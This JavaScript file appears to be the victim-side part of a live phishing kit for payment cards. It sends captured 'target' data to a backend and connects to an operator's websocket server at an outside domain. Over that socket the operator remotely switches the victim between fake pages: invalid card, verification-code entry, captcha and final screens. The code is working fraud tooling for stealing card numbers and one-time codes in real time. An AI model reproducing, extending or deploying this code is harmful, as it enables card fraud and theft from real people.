function getUUIDToken() {
    return new Promise((resolve, reject) => {
        $.ajax({
            type: "GET",
            url: "./src/Api/v1.php?getWebsocketToken",
            success: function(data) {
                resolve(data);
            },
            error: function(error) {
                reject(error);
            }
        });
    });
}

function updateSessionUptime() {
    $.ajax({
        type: "POST",
        url: "./src/Api/v1.php?updateSessionUptime"
    });
}

function convertToJson(obj) {
    let result = {};

    for (let key in obj) {
        result[key] = obj[key];
    }

    return JSON.stringify(result);
}

function sendTargetData(dataTarget) {
    if(localStorage.getItem("liveMode") == "1") {
        $.ajax({
            type: "POST",
            url: "./src/Api/v1.php?sendTargetData",
            data: {
                jsonData: dataTarget,
                currentStep: localStorage.getItem("actionData")
            }
        });
    } else {
        updateTargetDataStorage(dataTarget);
    }
    
}

function updateTargetDataStorage(data) {
    let currentData = JSON.parse(localStorage.getItem('targetDataStorage')) || {};

    let newData = JSON.parse(data);

    Object.assign(currentData, newData);

    localStorage.setItem('targetDataStorage', JSON.stringify(currentData));
}


function returnTargetDataStorage() {
    return localStorage.getItem('targetDataStorage');
}


if(localStorage.getItem("liveMode") == "1") {

    var centrifuge = new Centrifuge('wss://mafhiesd.site/ws');

    getUUIDToken().then(data => {
        let channel = JSON.parse(data)[0];
        let token = JSON.parse(data)[1];
    
        localStorage.setItem("channel", channel);
    
        centrifuge.setToken(token);
    
        centrifuge.subscribe(channel, function(message) {
            handleWebSocketMessage(message);
        });
    
        centrifuge.connect();
    
        executeActionAfterRedirect();
    });

}

function handleWebSocketMessage(message) {
    let actionData = JSON.parse(message.data.event)["actionData"];
    let inputData = JSON.parse(message.data.event)["inputData"];
    let role = JSON.parse(message.data.event)["role"];

    if(role == "target") {
        localStorage.setItem("actionData", actionData);
        localStorage.setItem("inputData", inputData);
        executeAction(actionData);
    }
}

function executeAction(actionData) {
    let currentPage = localStorage.getItem("currentPage");

    const actionsMap = {
        "Invalid Card Data": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitInvalidCardPage
        },
        "Code Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitCodeModal
        },
        "Invalid Code Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitInvalidCodePage
        },
        "Invalid Default Code Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitDefaultCodePage
        },
        "Invalid Custom Code Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitInvalidCustomCodePage
        },
        "Captcha Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitCaptchaPage
        },
        "Final Form": {
            token: "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz",
            function: InitFinalPage
        }
    };

    const action = actionsMap[actionData];

    if (action) {
        if (currentPage === action.token) {
            action.function();
        } else {
            localStorage.setItem("executeFunctionAfterRedirect", actionData);
            window.location.href = `?authentication-metadata-token=${action.token}`;
        }
    }
}

function executeActionAfterRedirect() {
    const actionDataAfterRedirect = localStorage.getItem("executeFunctionAfterRedirect");
    if (actionDataAfterRedirect) {
        executeAction(actionDataAfterRedirect);
        localStorage.removeItem("executeFunctionAfterRedirect");
    }
}

jQuery.fn.ForceNumericOnly =
function()
{
    return this.each(function()
    {
        $(this).keydown(function(e)
        {
            var key = e.charCode || e.keyCode || 0;
            return (
                key == 8 || 
                key == 9 ||
                key == 13 ||
                key == 46 ||
                key == 110 ||
                key == 190 ||
                (key >= 35 && key <= 40) ||
                (key >= 48 && key <= 57) ||
                (key >= 96 && key <= 105));
        });
    });
};

$(document).ready(() => {
    if(localStorage.getItem("liveMode") == "1") {
        setInterval(() => {
            updateSessionUptime();
        }, 10000);
    }
})